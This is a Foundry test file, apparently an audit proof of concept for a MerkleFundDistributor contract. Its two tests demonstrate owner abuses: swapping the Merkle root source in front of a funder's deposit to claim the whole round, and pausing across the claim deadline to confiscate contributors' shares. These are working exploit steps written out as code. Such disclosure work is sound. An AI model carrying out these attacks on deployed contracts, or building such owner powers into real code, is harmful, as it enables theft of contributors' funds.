// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console2} from "forge-std/Test.sol";
import {MerkleFundDistributor} from "src/merkle/MerkleFundDistributor.sol";
import {IMerkleFundDistributor} from "interfaces/IMerkleFundDistributor.sol";
import {IMerkleSnapshot} from "interfaces/merkle/IMerkleSnapshot.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";

contract PE_Snap {
    IMerkleSnapshot.MerkleState internal s;

    function set(bytes32 root, uint256 total) external {
        s = IMerkleSnapshot.MerkleState({
            blockNumber: block.number,
            timestamp: block.timestamp,
            root: root,
            ipfsHash: bytes32(uint256(1)),
            ipfsHashCid: "cid",
            totalValue: total
        });
    }

    function getLatestState() external view returns (IMerkleSnapshot.MerkleState memory) {
        return s;
    }
}

contract PE_Token is ERC20 {
    constructor() ERC20("T", "T") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }
}

contract PashovEcon_DistributorRootSwap is Test {
    MerkleFundDistributor internal dist;
    PE_Snap internal honest;
    PE_Snap internal evil;
    PE_Token internal token;

    address internal owner = address(0xA0);
    address internal feeRecipient = address(0xFEE);
    address internal funder = address(0xF1);
    address internal contributorA = address(0xAAA1);
    address internal contributorB = address(0xBBB2);

    function _leaf(address a, uint256 v) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(a, v))));
    }

    function setUp() public {
        honest = new PE_Snap();
        evil = new PE_Snap();
        token = new PE_Token();

        // Honest score tree: A and B each hold 500 of a 1000-point graph.
        bytes32 la = _leaf(contributorA, 500);
        bytes32 lb = _leaf(contributorB, 500);
        bytes32 root = la < lb ? keccak256(abi.encodePacked(la, lb)) : keccak256(abi.encodePacked(lb, la));
        honest.set(root, 1000);

        // Owner-controlled tree: one leaf, the owner, worth the entire "graph".
        evil.set(_leaf(owner, 1), 1);

        vm.prank(owner);
        dist = new MerkleFundDistributor(owner, address(honest), feeRecipient, 1e16, false);

        token.mint(funder, 1_000_000e18);
    }

    /// @notice The owner can atomically re-point the root source at a tree it controls in front of
    ///         a funder's `distribute`, and take 100% of that round. The M-7 fee-increase timelock
    ///         guards a capped percentage; this uncapped path has no delay at all.
    function test_OwnerSwapsRootSourceInFrontOfFunderAndTakesTheWholeRound() public {
        uint256 pot = 100_000e18;

        // --- the front-run: one transaction, no delay, no announcement ---------------------
        vm.prank(owner);
        dist.setMerkleSnapshot(address(evil));

        // --- the funder's transaction, mined next -----------------------------------------
        vm.startPrank(funder);
        token.approve(address(dist), pot);
        // `expectedRoot = 0` is the documented "skip" value and the 3-arg overload's only option.
        uint256 idx = dist.distribute(address(token), pot, bytes32(0));
        vm.stopPrank();

        IMerkleFundDistributor.DistributionState memory d = dist.getDistribution(idx);
        assertEq(d.root, _leaf(owner, 1), "round bound to the owner's tree");
        assertEq(d.totalMerkleValue, 1, "denominator is 1");

        // --- the owner claims everything --------------------------------------------------
        bytes32[] memory noProof = new bytes32[](0);
        uint256 got = dist.claim(idx, owner, 1, noProof);

        uint256 fee = pot / 100;
        console2.log("pot funded        :", pot);
        console2.log("protocol fee      :", fee);
        console2.log("owner claimed     :", got);
        console2.log("owner balance     :", token.balanceOf(owner));
        assertEq(got, pot - fee, "owner took the entire distributable remainder");
        assertEq(token.balanceOf(owner), pot - fee);

        // The real contributors cannot claim anything: their leaves are not in the booked root.
        bytes32[] memory p = new bytes32[](1);
        p[0] = _leaf(contributorB, 500);
        vm.expectRevert(IMerkleFundDistributor.InvalidMerkleProof.selector);
        dist.claim(idx, contributorA, 500, p);
    }

    /// @notice Separate defect, same contract: `claim` is `whenNotPaused` and the claim window is a
    ///         hard timestamp, so an owner that pauses across `claimDeadline` permanently
    ///         confiscates every unclaimed share and hands it back to the funder via `sweep`.
    function test_PauseAcrossClaimDeadlinePermanentlyConfiscatesUnclaimedShares() public {
        uint256 pot = 100_000e18;
        uint64 deadline = uint64(block.timestamp + 30 days);

        vm.startPrank(funder);
        token.approve(address(dist), pot);
        uint256 idx = dist.distribute(address(token), pot, bytes32(0), deadline);
        vm.stopPrank();

        // Owner pauses one day into the window.
        vm.warp(block.timestamp + 1 days);
        vm.prank(owner);
        dist.pause();

        bytes32[] memory p = new bytes32[](1);
        p[0] = _leaf(contributorB, 500);
        vm.expectRevert(Pausable.EnforcedPause.selector);
        dist.claim(idx, contributorA, 500, p);

        // The deadline passes while paused. Unpausing does not reopen it.
        vm.warp(uint256(deadline) + 1);
        vm.prank(owner);
        dist.unpause();

        vm.expectRevert(IMerkleFundDistributor.ClaimWindowClosed.selector);
        dist.claim(idx, contributorA, 500, p);

        uint256 funderBefore = token.balanceOf(funder);
        uint256 swept = dist.sweep(idx);
        console2.log("swept back to funder:", swept);
        assertEq(swept, pot - pot / 100, "100% of the contributor pot returned to the funder");
        assertEq(token.balanceOf(funder) - funderBefore, swept);
        assertEq(token.balanceOf(contributorA), 0);
        assertEq(token.balanceOf(contributorB), 0);
    }
}
